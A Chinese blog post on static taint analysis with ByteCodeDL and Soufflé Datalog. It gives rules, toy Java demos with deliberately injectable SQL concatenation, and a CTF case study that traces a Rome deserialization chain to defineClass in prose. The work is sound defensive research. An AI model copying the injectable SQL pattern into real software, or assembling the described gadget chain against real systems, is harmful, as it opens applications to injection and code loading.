+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405165330630.png" alt="image-20230405165330630" style="zoom:50%;"></p>
+<p>基本上和前面实现污点分析时的代码区别不大，细节在于需要注意污点对象的生成的处理（因为污点对象本身不受类型转换的影响，但是随遇一些 <code>SanitizationMethod</code> 会被过滤）</p>
+<p>预定义谓词</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 污点分析相关的新relation</span><br><span class="line">// 表示通过insn指令，创建的新的污点对象heap，包括污点源的生成，以及污点转移时的生成</span><br><span class="line">.decl TaintHeap(insn:Insn, heap:Heap)</span><br><span class="line">// 表示调用指令insn发生时，危险函数的参数指向了污点对象heap</span><br><span class="line">.decl Leak(insn:Insn, heap:Heap)</span><br><span class="line">// 表示source函数，其返回值表示污点源</span><br><span class="line">.decl SourceMethod(method:Method)</span><br><span class="line">// 表示sink函数，其第n个实际参数如果指向污点对象，则表示可能存在安全风险</span><br><span class="line">.decl SinkMethod(method:Method, n:number)</span><br><span class="line">// 表示sanitize函数，经过其处理的污点，将不再是污点，也就是说污点无法通过sanitize传播，是在实际参数向形式参数传播时阻断的</span><br><span class="line">.decl SanitizeMethod(method:Method)</span><br><span class="line">// 表示sanitize函数的形式参数</span><br><span class="line">.decl SanitizeMethodParam(var:Var)</span><br><span class="line">// 筛选出sanitize函数的形式参数</span><br><span class="line">SanitizeMethodParam(var) :-</span><br><span class="line">    FormalParam(_, method, var),</span><br><span class="line">    SanitizeMethod(method).</span><br><span class="line"></span><br><span class="line">// 污点转移相关的</span><br><span class="line">// base 是 污点 返回值也是污点</span><br><span class="line">.decl BaseToRetTransfer(method:Method)</span><br><span class="line">// 参数是污点返回也是污点</span><br><span class="line">.decl ArgToRetTransfer(method:Method, n:number)</span><br><span class="line">// 将上面两个合并成一个，或者将污点转移抽象成from变量污染了to变量</span><br><span class="line">.decl IsTaintedFrom(insn:Insn, from:Var, to:Var)</span><br><span class="line">// heap 对象 污染了 newHeap对象</span><br><span class="line">.decl TransferTaint(heap:Heap, newHeap:Heap)</span><br></pre></td></tr></table></figure>
+<p>那么就重点看下污点对象生成的规则：第一个规则是对 source 函数的处理，其将会产生污点对象。其中 <code>cat</code> 函数可以枚举所有符合条件的 insn 并和字符串拼接，标识这是一个污点对象；第二个规则是判断 Sink 点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 污点对象的生成</span><br><span class="line">TaintHeap(insn, heap),</span><br><span class="line">VarPointsTo(heap, to) :-</span><br><span class="line">    SourceMethod(callee),</span><br><span class="line">    CallGraph(insn, _, callee),</span><br><span class="line">    AssignReturnValue(insn, to),</span><br><span class="line">    heap = cat(&quot;NewTainted::&quot;, insn).</span><br><span class="line">// 判断sink函数的参数是否指向污点对象</span><br><span class="line">Leak(insn, heap) :-</span><br><span class="line">    CallGraph(insn, _, callee),</span><br><span class="line">    SinkMethod(callee, n),</span><br><span class="line">    ActualParam(n, insn, arg),</span><br><span class="line">    VarPointsTo(heap, arg),</span><br><span class="line">    TaintHeap(_, heap).</span><br></pre></td></tr></table></figure>
+<p>接下来是污点传播：论文中给出了 base -&gt; ret 以及 arg -&gt; ret 的两种描述规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// base -&gt; ret</span><br><span class="line">    IsTaintedFrom(insn, base, ret) :-</span><br><span class="line">        CallGraph(insn, _, callee),</span><br><span class="line">        BaseToRetTransfer(callee),</span><br><span class="line">        VirtualMethodInvocation(insn, _, _, base, _),</span><br><span class="line">        AssignReturnValue(insn, ret).</span><br><span class="line">// arg -&gt; ret</span><br><span class="line">    IsTaintedFrom(insn, arg, ret) :-</span><br><span class="line">        CallGraph(insn, _, callee),</span><br><span class="line">        ArgToRetTransfer(callee, n),</span><br><span class="line">        ActualParam(n, insn, arg),</span><br><span class="line">        AssignReturnValue(insn, ret).</span><br></pre></td></tr></table></figure>
+<p>进一步，将上述两个污点传播合并为一个污点转移规则。注意这里实际做了一个后向传播的设计，即所有和 to 一样指向 oldHeap 的变量，由于 to 被污染导致指向了一个新的污点对象 newHeap ，那么根据指针传播规则，其余的变量也要同样指向 newHeap ，也就是一并污染</p>
+<p>来自 chatGPT 的解释：</p>
+<blockquote>
+<p>简单来说，当一个污点值作为参数流向一个变换函数时，第三个规则<strong>会在任何分配和首次赋值堆对象的点上创建一个新的污点值，只要这些对象最终会流向函数的返回变量</strong>。这样做的好处在于，可以充分利用程序中的信息，准确地跟踪污点值的流动，并将其限制在可能被利用的路径上。这种技术可以提高静态分析的精度和可靠性，从而更好地检测程序中的漏洞和安全问题。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 污点转移</span><br><span class="line">  // from 指向了污点对象heap</span><br><span class="line">  // 且from能污染to</span><br><span class="line">  // 那么to也是污点对象，也要指向一个污点对象</span><br><span class="line">  // 这里没有直接让to指向新创建的污点对象</span><br><span class="line">  // 而是先找到to指向的正常对象oldHeap，oldHeap第一个流向的指针var，然后让newHeap也流向指针var，即var指向newHeap</span><br><span class="line">  // 由于oldHeap流向var之后，通过PFG可以流到to，那么newHeap也能流到to，这样也把和var alias的指针一并污染了</span><br><span class="line">  TaintHeap(insn, newHeap),</span><br><span class="line">  TransferTaint(heap, newHeap),</span><br><span class="line">  VarPointsTo(newHeap, var) :- </span><br><span class="line">      IsTaintedFrom(insn, from, to),</span><br><span class="line">      VarPointsTo(heap, from),</span><br><span class="line">      TaintHeap(_, heap),</span><br><span class="line">      // 污点转移函数构建新的污点对象</span><br><span class="line">      newHeap = cat(&quot;TransferTaint::&quot;, insn),</span><br><span class="line">      VarPointsTo(oldHeap, to),</span><br><span class="line">      AssignHeapAllocation(_, _, oldHeap, var, _, _).</span><br></pre></td></tr></table></figure>
+<h4 id="6-Demo-复现"><a href="#6-Demo-复现" class="headerlink" title="6. Demo 复现"></a>6. Demo 复现</h4><ol>
+<li><p>Benchmark-TaintDemo3</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaintDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TaintDemo3</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TaintDemo3</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> demo.Source();</span><br><span class="line">        demo.test1(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        String sql0= <span class="string">&quot;select * from user where name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> sql0;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> Sanitize(sql1);</span><br><span class="line">        Sink(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Sink</span><span class="params">(String param)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Sanitize</span><span class="params">(String param)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> param.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Source</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;tainted name&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之前已经生成过 facts 集，所以这里直接编写污点传播规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;logic/ptaint.dl&quot;</span><br><span class="line">#include &quot;logic/inputDeclaration.dl&quot;</span><br><span class="line">#include &quot;logic/utils.dl&quot;</span><br><span class="line"></span><br><span class="line">.init ptaint = PTaint</span><br><span class="line"></span><br><span class="line">// 配置入口</span><br><span class="line">ptaint.Reachable(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: void main(java.lang.String[] args)&gt;&quot;).</span><br><span class="line"></span><br><span class="line">// 配置 source</span><br><span class="line">ptaint.SourceMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: java.lang.String Source()&gt;&quot;).</span><br><span class="line"></span><br><span class="line">// 配置 sink</span><br><span class="line">ptaint.SinkMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: void Sink(java.lang.String)&gt;&quot;, 0).</span><br><span class="line"></span><br><span class="line">// 配置污点转移函数</span><br><span class="line">ptaint.BaseToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;&quot;).</span><br><span class="line">ptaint.BaseToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.String toString()&gt;&quot;).</span><br><span class="line"></span><br><span class="line">ptaint.ArgToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;&quot;, 0).</span><br><span class="line"></span><br><span class="line">// 配置净化函数</span><br><span class="line">ptaint.SanitizeMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: java.lang.String Sanitize(java.lang.String)&gt;&quot;)</span><br><span class="line"></span><br><span class="line">.decl TaintVar(var:Var)</span><br><span class="line"></span><br><span class="line">TaintVar(var) :-</span><br><span class="line">	ptaint.VarPointsTo(heap, var),</span><br><span class="line">	ptaint.TaintHeap(_, heap).</span><br><span class="line"></span><br><span class="line">.output TaintVar</span><br><span class="line">.output ptaint.TaintHeap</span><br><span class="line">.output ptaint.TransferTaint</span><br><span class="line">.output ptaint.VarPointsTo</span><br></pre></td></tr></table></figure>
+<p>其中一个困难点在于如何配置污点转移函数，需要用到 soot 生成的 Jimple 代码来判断</p>
+<p>原因在于.从源代码中我们无法得到字符串底层所进行的操作</p>
+<p>查看 Jimple 代码可以看到，底层实际做的是字符串的拼接操作。污点数据污染方向为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name#_0</span><br><span class="line">	-&gt; $stack7 </span><br><span class="line">		-&gt; $stack8 </span><br><span class="line">			-&gt; sql0#_11</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405194355661.png" alt="image-20230405194355661"></p>
+<p>运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F pt_free_test/ -D . example1.dl</span><br></pre></td></tr></table></figure>
+<p>查看结果如下</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405200852994.png" alt="image-20230405200852994"></p>
+</li>
+<li><p>Benchmark-TaintDemo2</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaintDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TaintDemo2</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TaintDemo2</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> demo.Source();</span><br><span class="line">        demo.test1(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        sql = Sanitize(sql);</span><br><span class="line">        Sink(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Sink</span><span class="params">(String param)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Sanitize</span><span class="params">(String param)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> param.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Source</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;tainted name&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里与 TaintDemo3 存在区别的地方位于 <code>test1()</code> 方法</p>
+<p>这里并没有临时变量 sq0/1 而是一直用一个变量</p>
+<p>我们查看下 Jimple 语句：</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406183422636.png" alt="image-20230406183422636"></p>
+<p>查看一下 souffle 分析出来的污点变量</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406183910435.png" alt="image-20230406183910435"></p>
+<p>这里可以看到 Sink 点也被污染了，原因在于这里由于全都用的是一个变量，加上分析过程为<strong>流不敏感</strong>，导致出现在净化之前污染了 Sink 点</p>
+<p>解决方式：soot-fact-generator 的 <code>--ssa</code> 参数，可以支持流敏感分析</p>
+<p>加上该参数后，生成的将是 Shimple 文件，由图可以看到所有赋值语句变量名均是唯一的，即<strong>区分原本两个同名变量在不同时刻的值</strong>，以此保持流敏感</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406185244402.png" alt="image-20230406185244402"></p>
+<p>验证污点结果也可以看到并未污染到 Sink 点</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406184948645.png" alt="image-20230406184948645"></p>
+</li>
+</ol>
+<h4 id="7-案例学习-使用ByteCodeDL分析长城杯CTF-b4bycoffee"><a href="#7-案例学习-使用ByteCodeDL分析长城杯CTF-b4bycoffee" class="headerlink" title="7. [案例学习] 使用ByteCodeDL分析长城杯CTF b4bycoffee"></a>7. [案例学习] 使用ByteCodeDL分析长城杯CTF b4bycoffee</h4><ul>
+<li>先分析一下源码</li>
+</ul>
+<p>这道题给了入口点 <code>com.example.b4bycoffee.controller#order()</code> 存在 <code>AntObjectInputStream</code> 重写的 <code>readObject()</code></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406191931032.png" alt="image-20230406191931032"></p>
+<p>这里可以看到在 AntObjectInputStream 的构造函数中构建了黑名单列表</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406191857845.png" alt="image-20230406191857845"></p>
+<p>题目环境给了 Rome 依赖，并且有个 CoffeeBean类的 <code>toString()</code> 方法可以加载字节码。那么配合 Rome 的 EqualsBean类在HashMap put操作时会触发对 key 的 hashCode 操作，进一步调用 toString() 方法可以接上利用链</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230406201535483.png" alt="image-20230406201535483"></p>
+<p>「ByteCodeDL 自动化检索」</p>
+<ol>
+<li><p>入口函数：toString，hashCode，compareTo</p>
+<p>source field</p>
+<p>sink defineclass</p>
+<p>规则如下：</p>
+<p>这里注意细节：</p>
+<ul>
+<li>污点源只设置了 field 字段可控</li>
+<li>入口函数因为性能原因也只设置了 com.example.b4bycoffee.model.CoffeeBean</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#define MAXSTEP 5</span><br><span class="line">#define CHAO 1</span><br><span class="line"></span><br><span class="line">#include &quot;logic/ptaint.dl&quot;</span><br><span class="line">#include &quot;logic/cha.dl&quot;</span><br><span class="line"></span><br><span class="line">.init ptaint = PTaint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 1. toString() -[*]-&gt; defineclass()</span><br><span class="line">// 2. </span><br><span class="line">// 定义 CHA 入口函数 </span><br><span class="line">EntryPoint(simplename, descriptor, class) :-</span><br><span class="line">	simplename = &quot;toString&quot;,</span><br><span class="line">	descriptor = &quot;()Ljava/lang/String;&quot;,</span><br><span class="line">	SubClass(class, &quot;java.io.Serializable&quot;), </span><br><span class="line">	// TODO: 不加会慢</span><br><span class="line">	class = &quot;com.example.b4bycoffee.model.CoffeeBean&quot;.</span><br><span class="line"></span><br><span class="line">// 定义 CHA 的 sink</span><br><span class="line">SinkDesc(&quot;defineClass&quot;, &quot;java.lang.ClassLoader&quot;). </span><br><span class="line"></span><br><span class="line">// 将可到达 sink 的入口函数 作为污点分析的起点</span><br><span class="line">ptaint.Reachable(method) :-</span><br><span class="line">	SinkReachable(method, _, _), </span><br><span class="line">	EntryMethod(method).</span><br><span class="line"></span><br><span class="line">.output SinkReachable</span><br><span class="line"></span><br><span class="line">// 定义污点分析当中的 sink</span><br><span class="line">ptaint.SinkMethod(method, 1) :- </span><br><span class="line">	MethodInfo(method, &quot;defineClass&quot;, _, class, _, _, _), </span><br><span class="line">	SubEqClass(class, &quot;java.lang.ClassLoader&quot;).</span><br><span class="line"></span><br><span class="line">// 对反序列化的对象进行 mock this 指向虚拟创建的对象</span><br><span class="line">NormalHeap(heap, class),</span><br><span class="line">ptaint.TaintHeap(insn, heap),</span><br><span class="line">ptaint.VarPointsTo(heap, this) :-</span><br><span class="line">    EntryPoint(simplename, descriptor, class),</span><br><span class="line">    Dispatch(simplename, descriptor, class, method),</span><br><span class="line">    ThisVar(method, this),</span><br><span class="line">    insn = cat(&quot;Mock&quot;, class),</span><br><span class="line">    heap = cat(&quot;NewTainted::&quot;, insn).</span><br><span class="line"></span><br><span class="line">// ex. CoffeeBean 中 ClassByte 字段可控，因此 load field 将使得左边变量同样可控</span><br><span class="line">// 如果对象是污点，反序列化的时候认为其 field 都可控，那么 load field 也是污点</span><br><span class="line">NormalHeap(newHeap, class),</span><br><span class="line">ptaint.TaintHeap(insn, newHeap),</span><br><span class="line">ptaint.TransferTaint(heap, newHeap),</span><br><span class="line">ptaint.VarPointsTo(newHeap, var) :-</span><br><span class="line">    ptaint.Reachable(inMethod),</span><br><span class="line">    // var = base.field</span><br><span class="line">    LoadInstanceField(insn, _, var, base, field, inMethod),</span><br><span class="line">    FieldInfo(field, _, _, type),</span><br><span class="line">    // 所有子类，这里可能是保证 sound ?</span><br><span class="line">    SubEqClass(class, type),</span><br><span class="line">    // base 为污点对象</span><br><span class="line">    ptaint.VarPointsTo(heap, base),</span><br><span class="line">    ptaint.TaintHeap(_, heap),</span><br><span class="line">    // 通过 load field 也会产生污点对象</span><br><span class="line">    newHeap = cat(&quot;TransferTaint::Mock::Load&quot;, insn).</span><br><span class="line"></span><br><span class="line">.decl TaintVar(var:Var)</span><br><span class="line"></span><br><span class="line">// 可控变量</span><br><span class="line">TaintVar(var) :-</span><br><span class="line">    ptaint.VarPointsTo(head, var), </span><br><span class="line">    ptaint.TaintHeap(_, heap). </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.decl SinkTaintVar(var:Var, heap:Heap)</span><br><span class="line"></span><br><span class="line">// 污点实际出现在 sink 的第 n 个参数上</span><br><span class="line">SinkTaintVar(var, heap) :-</span><br><span class="line">    ptaint.CallGraph(insn, caller, method), </span><br><span class="line">    ptaint.SinkMethod(method, n), </span><br><span class="line">    VirtualMethodInvocation(insn, _, _, _, caller), </span><br><span class="line">    ActualParam(n, insn, var), </span><br><span class="line">    ptaint.VarPointsTo(heap, var), </span><br><span class="line">    ptaint.TaintHeap(_, heap).  </span><br><span class="line"></span><br><span class="line">.output TaintVar</span><br><span class="line">.output SinkTaintVar</span><br><span class="line"></span><br><span class="line">.output ptaint.TaintHeap</span><br><span class="line">.output ptaint.TransferTaint</span><br><span class="line">.output ptaint.VarPointsTo</span><br><span class="line">.output ptaint.SinkMethod</span><br><span class="line">.output ptaint.CallGraph</span><br></pre></td></tr></table></figure>
+<p>运行生成 facts 并启动分析引擎</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-fact-generator.jar -i b4bycoffee-0.0.1-SNAPSHOT.jar --full -l /Library/Java/JavaVirtualMachines/jdk1.8.0_121.jdk/Contents/Home/jre/lib/rt.jar -d ../example/changchengCTF --allow-phantom --generate-jimple</span><br><span class="line"></span><br><span class="line">souffle -F changchengCTF/ -D . exp.dl</span><br></pre></td></tr></table></figure>
+<p>输出污点变量如下：可以看到污点数据从 field 传到了 stack6/8 以及最终的 sink 函数上</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407192956829.png" alt="image-20230407192956829"></p>
+</li>
+</ol>
+<p>从 Jimple 文件中验证确实从 base.field 当中通过 load 传递了污点</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407192759099.png" alt="image-20230407192759099"></p>
+<p>从 SinkTaintVar.csv 中可以大致看出污点传播路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CoffeeBean#toString() -&gt; </span><br><span class="line">	read-field-ClassByte -&gt;</span><br><span class="line">		defineClass()</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230407195053988.png" alt="image-20230407195053988"></p>
+<p>困难之处：</p>
+<ol>
+<li>污点转换函数如何构造？</li>
+<li>这里如果不限制入口函数位于 com.example.b4bycoffee.model.CoffeeBean 类中，即扩大入口函数量，性能开销如何优化？</li>
+<li>污点源如何构造，这里只写了通过 this 以及 load field 来构造污点 source，实际可能还有从参数传递、或者一些函数如 <code>readObject()</code> 作为污点 source</li>
+<li>似乎还是不支持对 springboot 依赖的分析？</li>
+</ol>
+<p><strong>TODO：<a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/discussions/10">https://github.com/BytecodeDL/ByteCodeDL/discussions/10</a></strong></p>
